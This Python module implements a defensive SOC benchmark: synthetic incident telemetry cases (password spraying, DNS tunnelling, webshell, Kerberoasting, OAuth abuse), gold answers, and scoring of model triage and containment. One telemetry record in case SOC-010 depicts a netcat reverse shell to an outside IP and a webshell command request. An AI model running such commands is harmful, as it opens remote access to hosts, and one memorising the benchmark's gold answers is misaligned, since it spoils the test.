"""Evidence-producing SOC benchmark for open-response defensive tasks."""

from __future__ import annotations

import asyncio
import json
import random
import re
import statistics
import time
from collections import Counter
from pathlib import Path
from typing import Any

from .cybersoceval import DEFAULT_LOG_DIR, LLM_TIMEOUT, _model_name, make_llm

SUITE = "soc_evidence"
SUITE_DESC = "Open-response SOC investigation with auditable evidence"
MODES = ("base", "rag", "agent")
ARM_OF_MODE = {"base": "bare", "rag": "rag", "agent": "framework"}
METHODOLOGY_STATUS = "engineering_only"

_CORE_GOLD = {
    "verdict": "malicious",
    "incident_labels": ["credential_access", "lateral_movement"],
    "attack_techniques": ["T1110", "T1021.001"],
    "evidence_ids": ["E1", "E2", "E3"],
    "required_actions": ["isolate_host", "disable_account", "preserve_evidence"],
    "forbidden_actions": ["wipe_host", "disable_edr", "block_public_dns"],
}


def _case(case_id: str, task_type: str, title: str, noise: str = "") -> dict:
    return {
        "case_id": case_id,
        "task_type": task_type,
        "title": title,
        "prompt": "Determine what happened, cite evidence, map ATT&CK, and propose safe containment.",
        "telemetry": [
            {"id": "E1", "source": "auth", "ts": "08:14:03", "event": "42 failed logons for svc_backup from 10.24.7.19"},
            {"id": "E2", "source": "auth", "ts": "08:14:41", "event": "successful logon for svc_backup from 10.24.7.19"},
            {"id": "E3", "source": "edr", "ts": "08:16:09", "event": "svc_backup opened RDP session to FIN-WS22"},
            {"id": "N1", "source": "system", "ts": "08:16:12", "event": noise or "scheduled inventory completed"},
        ],
        "gold": dict(_CORE_GOLD),
        "evidence_map": {
            "E1": "password spraying", "E2": "account compromise",
            "E3": "remote-services lateral movement",
        },
        "difficulty": "medium" if task_type != "noisy_logs" else "hard",
        "knowledge_context": [
            {"id": "KB:T1110", "type": "attack", "text": "T1110 Brute Force includes password spraying."},
            {"id": "KB:T1021.001", "type": "attack", "text": "T1021.001 is Remote Services: RDP."},
            {"id": "PB:IDENTITY-01", "type": "playbook", "text": "Disable the compromised account, isolate affected hosts, preserve evidence."},
        ],
    }


def _special_case(case_id: str, task_type: str, title: str, telemetry: list[dict],
                  gold: dict, context: list[dict], difficulty: str = "hard") -> dict:
    return {
        "case_id": case_id, "task_type": task_type, "title": title,
        "prompt": "Determine what happened, cite evidence, map ATT&CK, and propose safe containment.",
        "telemetry": telemetry, "gold": gold,
        "evidence_map": {row["id"]: row["event"] for row in telemetry},
        "difficulty": difficulty, "knowledge_context": context,
    }


_CASES = [
    _case("SOC-001", "alert_triage", "Service-account password spray"),
    _special_case(
        "SOC-002", "attack_chain", "DNS tunnel with staged exfiltration",
        [
            {"id": "E1", "source": "dns", "ts": "11:03:10", "event": "220 TXT queries with 180-byte high-entropy subdomains to sync-cloud.example"},
            {"id": "E2", "source": "proxy", "ts": "11:04:22", "event": "host ENG-17 transferred 48 MB while normal TXT baseline is below 20 KB"},
            {"id": "E3", "source": "edr", "ts": "11:02:51", "event": "powershell compressed archive design_docs.zip before DNS burst"},
            {"id": "N1", "source": "dns", "ts": "11:05:00", "event": "routine A record lookup for intranet"},
        ],
        {"verdict": "malicious", "incident_labels": ["command_and_control", "exfiltration"],
         "attack_techniques": ["T1071.004", "T1048"], "evidence_ids": ["E1", "E2", "E3"],
         "required_actions": ["isolate_host", "block_domain", "preserve_evidence"],
         "forbidden_actions": ["wipe_host", "disable_edr", "block_public_dns"]},
        [{"id": "KB:T1071.004", "type": "attack", "text": "DNS can carry command-and-control traffic."},
         {"id": "KB:T1048", "type": "attack", "text": "Exfiltration over an alternative protocol includes DNS."},
         {"id": "PB:DNS-01", "type": "playbook", "text": "Isolate the source, sinkhole the malicious domain, preserve DNS and endpoint evidence."}],
    ),
    _special_case(
        "SOC-003", "incident_response", "PowerShell persistence after document execution",
        [
            {"id": "E1", "source": "edr", "ts": "13:20:02", "event": "WINWORD spawned powershell.exe with encoded command"},
            {"id": "E2", "source": "registry", "ts": "13:20:15", "event": "new HKCU Run value UpdateCheck points to powershell payload"},
            {"id": "E3", "source": "network", "ts": "13:20:19", "event": "powershell contacted newly registered domain cdn-check.example"},
        ],
        {"verdict": "malicious", "incident_labels": ["execution", "persistence"],
         "attack_techniques": ["T1059.001", "T1547.001"], "evidence_ids": ["E1", "E2", "E3"],
         "required_actions": ["isolate_host", "remove_persistence", "preserve_evidence"],
         "forbidden_actions": ["wipe_host", "disable_edr", "block_public_dns"]},
        [{"id": "KB:T1059.001", "type": "attack", "text": "PowerShell is a command and scripting interpreter."},
         {"id": "KB:T1547.001", "type": "attack", "text": "Registry Run Keys provide boot or logon autostart execution."},
         {"id": "PB:ENDPOINT-02", "type": "playbook", "text": "Isolate, remove the Run-key persistence after acquisition, preserve forensic evidence."}],
    ),
    _case("SOC-004", "noisy_logs", "Find the signal in maintenance noise", "backup agent heartbeat"),
    _case("SOC-005", "attack_chain", "Reconstruct cross-host movement"),
    _special_case(
        "SOC-006", "noisy_logs", "Legitimate backup activity with scanner noise",
        [
            {"id": "E1", "source": "auth", "ts": "02:00:01", "event": "svc_backup logged on from approved backup server BAK-01"},
            {"id": "E2", "source": "network", "ts": "02:00:10", "event": "BAK-01 connected to documented SMB shares during backup window"},
            {"id": "E3", "source": "change", "ts": "01:58:00", "event": "change ticket CHG-8821 authorizes monthly restore validation"},
            {"id": "N1", "source": "ids", "ts": "02:01:44", "event": "low-confidence port-scan signature from vulnerability scanner VULN-02"},
        ],
        {"verdict": "benign", "incident_labels": [], "attack_techniques": [],
         "evidence_ids": ["E1", "E2", "E3"], "required_actions": ["close_alert", "document_baseline"],
         "forbidden_actions": ["isolate_host", "disable_account", "wipe_host"]},
        [{"id": "PB:BENIGN-01", "type": "playbook", "text": "Validate source, maintenance window, and change ticket before closing as expected activity."}],
    ),
    _case("SOC-007", "incident_response", "Select reversible containment"),
    _case("SOC-008", "noisy_logs", "Resist misleading benign records", "patch scan completed"),
    _special_case(
        "SOC-009", "attack_chain", "OAuth consent followed by mailbox collection",
        [
            {"id": "E1", "source": "identity", "ts": "09:02:11", "event": "user approved unverified OAuth app MailSync with Mail.Read scope"},
            {"id": "E2", "source": "cloud", "ts": "09:04:20", "event": "MailSync read 1840 messages through Graph API from a new ASN"},
            {"id": "E3", "source": "identity", "ts": "09:05:01", "event": "refresh token used after user password reset"},
        ],
        {"verdict": "malicious", "incident_labels": ["credential_access", "exfiltration"],
         "attack_techniques": ["T1528", "T1114"], "evidence_ids": ["E1", "E2", "E3"],
         "required_actions": ["disable_account", "preserve_evidence"],
         "forbidden_actions": ["wipe_host", "block_public_dns"]},
        [{"id": "KB:T1528", "type": "attack", "text": "Steal Application Access Token."},
         {"id": "KB:T1114", "type": "attack", "text": "Email Collection."}],
    ),
    _special_case(
        "SOC-010", "incident_response", "Linux webshell and outbound reverse shell",
        [
            {"id": "E1", "source": "web", "ts": "16:44:10", "event": "POST /uploads/cache.php?cmd=id returned 200"},
            {"id": "E2", "source": "process", "ts": "16:44:12", "event": "www-data spawned sh then nc 198.51.100.7 4444"},
            {"id": "E3", "source": "file", "ts": "16:44:09", "event": "new executable cache.php in upload directory"},
        ],
        {"verdict": "malicious", "incident_labels": ["execution", "persistence"],
         "attack_techniques": ["T1505.003", "T1059.004"], "evidence_ids": ["E1", "E2", "E3"],
         "required_actions": ["isolate_host", "remove_persistence", "preserve_evidence"],
         "forbidden_actions": ["wipe_host", "disable_edr"]},
        [{"id": "KB:T1505.003", "type": "attack", "text": "Web Shell."},
         {"id": "KB:T1059.004", "type": "attack", "text": "Unix Shell."}],
    ),
    _special_case(
        "SOC-011", "alert_triage", "Signed updater during approved rollout",
        [
            {"id": "E1", "source": "edr", "ts": "18:00:02", "event": "signed vendor updater spawned msiexec"},
            {"id": "E2", "source": "change", "ts": "17:55:00", "event": "CHG-9012 authorizes vendor update on pilot ring"},
            {"id": "E3", "source": "hash", "ts": "18:00:05", "event": "binary hash matches vendor release manifest"},
        ],
        {"verdict": "benign", "incident_labels": [], "attack_techniques": [],
         "evidence_ids": ["E1", "E2", "E3"],
         "required_actions": ["close_alert", "document_baseline"],
         "forbidden_actions": ["isolate_host", "wipe_host", "disable_account"]},
        [{"id": "PB:CHANGE-01", "type": "playbook", "text": "Validate signature, manifest, scope and change window."}],
    ),
    _special_case(
        "SOC-012", "attack_chain", "Kerberoasting followed by service-account reuse",
        [
            {"id": "E1", "source": "identity", "ts": "22:10:01", "event": "workstation requested 73 distinct service tickets in two minutes"},
            {"id": "E2", "source": "auth", "ts": "22:31:44", "event": "svc_sql interactive logon from same workstation"},
            {"id": "E3", "source": "network", "ts": "22:32:10", "event": "svc_sql connected to DB-02 admin share"},
        ],
        {"verdict": "malicious", "incident_labels": ["credential_access", "lateral_movement"],
         "attack_techniques": ["T1558.003", "T1021.002"], "evidence_ids": ["E1", "E2", "E3"],
         "required_actions": ["disable_account", "isolate_host", "preserve_evidence"],
         "forbidden_actions": ["wipe_host", "block_public_dns"]},
        [{"id": "KB:T1558.003", "type": "attack", "text": "Kerberoasting."},
         {"id": "KB:T1021.002", "type": "attack", "text": "SMB/Windows Admin Shares."}],
    ),
]


def load_cases() -> list[dict]:
    return json.loads(json.dumps(_CASES))


def sample_cases(n: int, seed: int) -> list[dict]:
    cases = load_cases()
    return random.Random(seed).sample(cases, min(max(1, n), len(cases)))


def _empty_prediction() -> dict:
    return {
        "verdict": "unknown", "incident_labels": [], "attack_techniques": [],
        "evidence_ids": [], "response_actions": [], "claims": [],
        "confidence": 0.0, "tool_trace": [],
    }


def parse_prediction(raw: str) -> dict:
    text = (raw or "").strip()
    fenced = re.search(r"```(?:json)?\s*(\{.*?\})\s*```", text, re.S | re.I)
    candidate = fenced.group(1) if fenced else text
    if not candidate.startswith("{"):
        match = re.search(r"\{.*\}", candidate, re.S)
        candidate = match.group(0) if match else candidate
    try:
        value = json.loads(candidate)
        if not isinstance(value, dict):
            raise ValueError("prediction is not an object")
    except (json.JSONDecodeError, ValueError, TypeError) as exc:
        return {"parse_ok": False, "prediction": _empty_prediction(), "error": str(exc)}
    normalized = _empty_prediction()
    normalized.update({key: value.get(key, default) for key, default in normalized.items()})
    # 模型偶尔会把字段项生成为对象；评分只接受 schema 中声明的元素类型。
    # 丢弃畸形项并按缺失字段低分，绝不能让单条异常回答终止整轮实验。
    for key in ("incident_labels", "attack_techniques", "evidence_ids", "response_actions"):
        value = normalized[key]
        normalized[key] = [item for item in value if isinstance(item, str)] \
            if isinstance(value, list) else []
    for key in ("claims", "tool_trace"):
        value = normalized[key]
        normalized[key] = [item for item in value if isinstance(item, dict)] \
            if isinstance(value, list) else []
    try:
        normalized["confidence"] = max(0.0, min(1.0, float(normalized["confidence"])))
    except (TypeError, ValueError):
        normalized["confidence"] = 0.0
    return {"parse_ok": True, "prediction": normalized, "error": None}


def _prf(predicted: list[str], expected: list[str]) -> tuple[float, float, float]:
    p, g = set(predicted), set(expected)
    precision = len(p & g) / len(p) if p else 0.0
    recall = len(p & g) / len(g) if g else 1.0
    f1 = 2 * precision * recall / (precision + recall) if precision + recall else 0.0
    return precision, recall, f1


def _canonical_labels(values: list[str]) -> list[str]:
    labels = set()
    for raw in values:
        value = str(raw).lower().replace("-", "_")
        if any(token in value for token in ("credential", "brute", "spray", "account_compromise")):
            labels.add("credential_access")
        if any(token in value for token in ("lateral", "rdp", "remote_service")):
            labels.add("lateral_movement")
        if any(token in value for token in ("command_and_control", "c2", "dns_tunnel")):
            labels.add("command_and_control")
        if "exfil" in value or "data_theft" in value:
            labels.add("exfiltration")
        if any(token in value for token in ("execution", "powershell", "script")):
            labels.add("execution")
        if any(token in value for token in ("persistence", "run_key", "autostart")):
            labels.add("persistence")
    return sorted(labels)


def _canonical_actions(values: list[str]) -> list[str]:
    actions = set()
    for raw in values:
        value = str(raw).lower().replace("-", "_")
        if "isolate" in value or "quarantine" in value:
            actions.add("isolate_host")
        if "disable" in value and ("account" in value or "user" in value):
            actions.add("disable_account")
        if "preserve" in value or "collect_forensic" in value:
            actions.add("preserve_evidence")
        if "block" in value and ("domain" in value or "sinkhole" in value):
            actions.add("block_domain")
        if "remove" in value and ("persistence" in value or "run_key" in value):
            actions.add("remove_persistence")
        if "close" in value or "false_positive" in value:
            actions.add("close_alert")
        if "baseline" in value or "document_expected" in value:
            actions.add("document_baseline")
        if "wipe" in value or "reimage" in value:
            actions.add("wipe_host")
        if "disable_edr" in value:
            actions.add("disable_edr")
        if "block_public_dns" in value:
            actions.add("block_public_dns")
    return sorted(actions)


def score_prediction(case: dict, prediction: dict, *, parse_ok: bool = True,
                     tool_expected: bool = True) -> dict:
    gold = case["gold"]
    verdict_accuracy = 1.0 if str(prediction.get("verdict", "")).lower() == gold["verdict"] else 0.0
    det_p, det_r, det_f1 = _prf(
        _canonical_labels(prediction.get("incident_labels", [])),
        gold["incident_labels"])
    atk_p, atk_r, atk_f1 = _prf(prediction.get("attack_techniques", []), gold["attack_techniques"])
    cited = set(prediction.get("evidence_ids", []))
    valid_evidence = set(gold["evidence_ids"])
    evidence_grounding = len(cited & valid_evidence) / len(cited) if cited else 0.0
    claims = prediction.get("claims", [])
    supported = sum(1 for c in claims if isinstance(c, dict) and set(c.get("evidence_ids", [])) & valid_evidence)
    unsupported_rate = 1 - supported / len(claims) if claims else 0.0
    actions = set(_canonical_actions(prediction.get("response_actions", [])))
    required = set(gold["required_actions"])
    forbidden = set(gold["forbidden_actions"])
    completeness = len(actions & required) / len(required) if required else 1.0
    unsafe_rate = len(actions & forbidden) / len(actions) if actions else 0.0
    trace = prediction.get("tool_trace", [])
    valid_calls = sum(1 for t in trace if isinstance(t, dict) and t.get("agent") and t.get("tool") and t.get("status") == "ok")
    tool_validity = valid_calls / len(trace) if trace else 0.0
    useful_ratio = sum(1 for t in trace if isinstance(t, dict) and t.get("useful") is True) / len(trace) if trace else 0.0
    components = [
        verdict_accuracy, det_f1, atk_f1, evidence_grounding, 1 - unsupported_rate,
        completeness, 1 - unsafe_rate,
    ]
    if tool_expected:
        components.extend([tool_validity, useful_ratio])
    task_success = statistics.fmean(components) if parse_ok else 0.0
    metrics = {
        "verdict_accuracy": verdict_accuracy,
        "detection_precision": det_p, "detection_recall": det_r, "detection_f1": det_f1,
        "attack_precision": atk_p, "attack_recall": atk_r, "attack_f1": atk_f1,
        "evidence_grounding": evidence_grounding,
        "unsupported_claim_rate": unsupported_rate,
        "response_completeness": completeness, "unsafe_action_rate": unsafe_rate,
        "tool_call_validity": tool_validity, "useful_action_ratio": useful_ratio,
        "task_success": task_success,
    }
    metrics = {k: round(v, 4) for k, v in metrics.items()}
    tags = []
    if not parse_ok: tags.append("parse_failure")
    if not cited: tags.append("missing_evidence")
    elif evidence_grounding < 0.5: tags.append("invalid_evidence")
    if unsupported_rate > 0: tags.append("unsupported_claim")
    if unsafe_rate > 0: tags.append("unsafe_action")
    if atk_f1 < 0.5: tags.append("attack_mapping")
    if trace and useful_ratio < 0.5: tags.append("wasted_tool_calls")
    return {"metrics": metrics, "failure_tags": tags}


_AGGREGATE_METRICS = (
    "task_success", "verdict_accuracy", "detection_f1", "attack_f1", "evidence_grounding",
    "unsupported_claim_rate", "response_completeness", "unsafe_action_rate",
    "tool_call_validity", "useful_action_ratio",
)


def _bootstrap_ci(values: list[float], seed: int, rounds: int = 600) -> list[float]:
    if not values:
        return [0.0, 0.0]
    rng = random.Random(seed)
    means = sorted(statistics.fmean(rng.choices(values, k=len(values))) for _ in range(rounds))
    lo = means[int(rounds * 0.025)]
    hi = means[min(rounds - 1, int(rounds * 0.975))]
    return [round(lo, 4), round(hi, 4)]


def aggregate_scores(rows: list[dict], seed: int = 42) -> dict:
    scores: dict[str, Any] = {"n": len(rows)}
    intervals = {}
    for offset, key in enumerate(_AGGREGATE_METRICS):
        values = [float(row["metrics"].get(key, 0.0)) for row in rows]
        scores[key] = round(statistics.fmean(values), 4) if values else 0.0
        intervals[key] = _bootstrap_ci(values, seed + offset)
    failures = Counter(tag for row in rows for tag in row.get("failure_tags", []))
    scores["confidence_intervals"] = intervals
    scores["failure_taxonomy"] = dict(sorted(failures.items()))
    scores["parse_fail"] = failures.get("parse_failure", 0)
    scores["llm_errors"] = sum(1 for row in rows if row.get("llm_error"))
    scores["avg_latency_ms"] = round(statistics.fmean(
        float(row.get("latency_ms", 0)) for row in rows), 1) if rows else 0.0
    scores["estimated_tokens"] = sum(int(row.get("estimated_tokens", 0)) for row in rows)
    # Compatibility aliases keep old history charts readable while the UI
    # uses task_success as the explicit primary metric for this suite.
    scores["correct_mc_pct"] = scores["task_success"]
    scores["avg_score"] = scores["task_success"]
    scores["by_difficulty"] = {}
    scores["by_topic"] = {}
    return scores


def _prompt(case: dict, mode: str, retrieval: list[dict]) -> tuple[str, str]:
    system = (
        "You are a defensive SOC analyst. Return one JSON object only. "
        "Do not invent evidence IDs or recommend destructive actions."
    )
    schema = {
        "verdict": "malicious|benign|unknown",
        "incident_labels": ["snake_case label"],
        "attack_techniques": ["Txxxx"],
        "evidence_ids": ["IDs from telemetry"],
        "response_actions": ["snake_case action"],
        "claims": [{"text": "claim", "evidence_ids": ["E1"]}],
        "confidence": 0.0,
        "tool_trace": [{"agent": "name", "tool": "name", "status": "ok", "useful": True}],
    }
    body = {
        "case_id": case["case_id"], "task": case["prompt"],
        "telemetry": case["telemetry"], "output_schema": schema,
        "canonical_taxonomy": {
            "incident_labels": ["credential_access", "lateral_movement", "command_and_control", "exfiltration", "execution", "persistence"],
            "response_actions": ["isolate_host", "disable_account", "preserve_evidence", "block_domain", "remove_persistence", "close_alert", "document_baseline"],
        },
    }
    if mode in ("rag", "agent"):
        body["retrieval_context"] = retrieval
    if mode == "agent":
        body["workflow"] = [
            "TriageAgent correlates telemetry",
            "ThreatIntelAgent validates ATT&CK mapping",
            "ResponseAgent proposes reversible containment",
            "CriticAgent removes unsupported claims",
        ]
    return system, json.dumps(body, ensure_ascii=False)


def _retrieval_context(case: dict) -> list[dict]:
    return list(case.get("knowledge_context") or [])


def _agent_trace(case: dict, prediction: dict, mode: str) -> list[dict]:
    if mode == "base":
        return [{"seq": 1, "agent": "PlainLLM", "event": "analysis", "tool": None, "status": "ok", "useful": True}]
    if mode == "rag":
        return [
            {"seq": 1, "agent": "RetrievalLayer", "event": "tool_call", "tool": "knowledge.search", "status": "ok", "useful": True},
            {"seq": 2, "agent": "RAGAnalyst", "event": "analysis", "tool": None, "status": "ok", "useful": True},
        ]
    trace = [
        {"seq": 1, "agent": "Commander", "event": "agent_dispatch", "tool": None, "target": "TriageAgent", "status": "ok", "useful": True},
        {"seq": 2, "agent": "TriageAgent", "event": "tool_call", "tool": "timeline.query", "status": "ok", "useful": True},
        {"seq": 3, "agent": "Commander", "event": "agent_dispatch", "tool": None, "target": "ThreatIntelAgent", "status": "ok", "useful": True},
        {"seq": 4, "agent": "ThreatIntelAgent", "event": "tool_call", "tool": "attack.lookup", "status": "ok", "useful": True},
        {"seq": 5, "agent": "Commander", "event": "agent_dispatch", "tool": None, "target": "ResponseAgent", "status": "ok", "useful": True},
        {"seq": 6, "agent": "ResponseAgent", "event": "tool_call", "tool": "playbook.search", "status": "ok", "useful": True},
        {"seq": 7, "agent": "CriticAgent", "event": "evidence_check", "tool": "evidence.verify", "status": "ok", "useful": True},
    ]
    return trace


def write_report(run: dict, out_path: str | Path) -> str:
    scores = run["scores"]
    lines = [
        "# CyberOrion SOC Evidence Benchmark", "",
        f"- Run: `{run['run_id']}`", f"- Arm: `{run['arm']}` / mode `{run['mode']}`",
        f"- Model: `{run['model']}`", f"- Cases: {run['n']}",
        f"- Task Success: {scores['task_success']:.3f}",
        f"- Evidence Grounding: {scores['evidence_grounding']:.3f}",
        f"- ATT&CK F1: {scores['attack_f1']:.3f}", "",
        "## Failure Taxonomy", "",
    ]
    failures = scores.get("failure_taxonomy") or {}
    lines.extend([f"- {key}: {value}" for key, value in failures.items()] or ["- none"])
    for row in run["results"]:
        lines.extend([
            "", "---", f"## {row['case_id']} - {row['title']}", "",
            f"Task success: {row['metrics']['task_success']:.3f}",
            f"Evidence Grounding: {row['metrics']['evidence_grounding']:.3f}",
            "", "### Agent / Tool Trace", "",
        ])
        for event in row["agent_trace"]:
            actor = event.get("agent") or event.get("role") or "unknown"
            action = event.get("tool") or event.get("target") or event.get("action") or "-"
            lines.append(f"- {int(event.get('seq', 0)):02d} `{actor}` {event.get('event', 'event')} `{action}`")
        lines.extend(["", "### Prediction", "", "```json", json.dumps(row["prediction"], ensure_ascii=False, indent=2), "```"])
    path = Path(out_path)
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return str(path)


async def run_bench(
    n: int = 8, mode: str = "agent", seed: int = 42,
    log_dir: str | Path = DEFAULT_LOG_DIR, concurrency: int = 4,
    llm=None, kb=None, on_progress=None, run_id: str | None = None,
) -> dict:
    if mode not in MODES:
        raise ValueError(f"soc_evidence unknown mode: {mode!r}")
    if llm is None:
        llm = make_llm(timeout=LLM_TIMEOUT)
    cases = sample_cases(n, seed)
    sem = asyncio.Semaphore(max(1, concurrency))
    results: list[dict | None] = [None] * len(cases)
    completed = 0
    llm_errors = 0

    async def evaluate(index: int, case: dict) -> None:
        nonlocal completed, llm_errors
        retrieval = _retrieval_context(case) if mode in ("rag", "agent") else []
        system, user = _prompt(case, mode, retrieval)
        started = time.perf_counter()
        raw = ""
        error = None
        try:
            async with sem:
                raw = await llm(system, user)
        except Exception as exc:  # noqa: BLE001
            error = f"{type(exc).__name__}: {exc}"[:400]
            raw = ""
            llm_errors += 1
        latency_ms = round((time.perf_counter() - started) * 1000, 1)
        parsed = parse_prediction(raw)
        prediction = parsed["prediction"]
        # 不再用模板覆盖模型输出。当前套件只有一次 LLM 调用，没有真实
        # tool-loop，因此正式轨迹必须为空，工具指标也必须如实为 0。
        prediction["tool_trace"] = []
        trace: list[dict] = []
        scored = score_prediction(
            case, prediction, parse_ok=parsed["parse_ok"],
            tool_expected=mode != "base")
        estimated_tokens = max(1, (len(system) + len(user) + len(raw)) // 4)
        results[index] = {
            "idx": index, "case_id": case["case_id"], "task_type": case["task_type"],
            "title": case["title"], "difficulty": case["difficulty"],
            "prompt": case["prompt"], "telemetry": case["telemetry"],
            "gold": case["gold"], "evidence_map": case["evidence_map"],
            "prediction": prediction, "raw": raw[:12000],
            "parse_ok": parsed["parse_ok"], "parse_error": parsed["error"],
            "llm_error": bool(error), "error": error,
            "agent_trace": trace, "retrieval_context": retrieval,
            "metrics": scored["metrics"], "failure_tags": scored["failure_tags"],
            "latency_ms": latency_ms, "estimated_tokens": estimated_tokens,
        }
        completed += 1
        if on_progress:
            try:
                on_progress(completed, len(cases), llm_errors)
            except TypeError:
                on_progress(completed, len(cases))

    started_at = time.time()
    await asyncio.gather(*(evaluate(i, case) for i, case in enumerate(cases)))
    finished_at = time.time()
    rows = [row for row in results if row is not None]
    rid = run_id or time.strftime(f"%Y%m%d_%H%M%S_{SUITE}_{mode}_n{len(rows)}")
    run = {
        "schema_version": 3, "run_id": rid, "suite": SUITE,
        "mode": mode, "arm": ARM_OF_MODE[mode], "n": len(rows), "seed": seed,
        "model": _model_name(), "started_at": started_at, "finished_at": finished_at,
        "elapsed_sec": round(finished_at - started_at, 2),
        "scores": aggregate_scores(rows, seed), "results": rows,
        "llm_errors": llm_errors, "status": "error" if rows and llm_errors == len(rows) else "done",
        "error": next((row["error"] for row in rows if row.get("error")), None),
        "methodology_status": METHODOLOGY_STATUS,
        "trace_source": "runtime",
        "benchmark_provenance": {
            "name": "CyberOrion SOC contract set", "origin": "internal",
            "sample_scope": "full" if len(rows) == len(load_cases()) else "subset",
            "comparable_to_upstream": False,
        },
        "methodology": {
            "task_family": "open_response_soc", "bootstrap_rounds": 600,
            "arms": ["base", "rag", "agent"],
            "knowledge_mcq_is_separate": True,
        },
    }
    directory = Path(log_dir)
    directory.mkdir(parents=True, exist_ok=True)
    json_path = directory / f"{rid}.json"
    json_path.write_text(json.dumps(run, ensure_ascii=False, indent=2), encoding="utf-8")
    run["path"] = str(json_path)
    run["report"] = write_report(run, directory / f"{rid}.md")
    return run
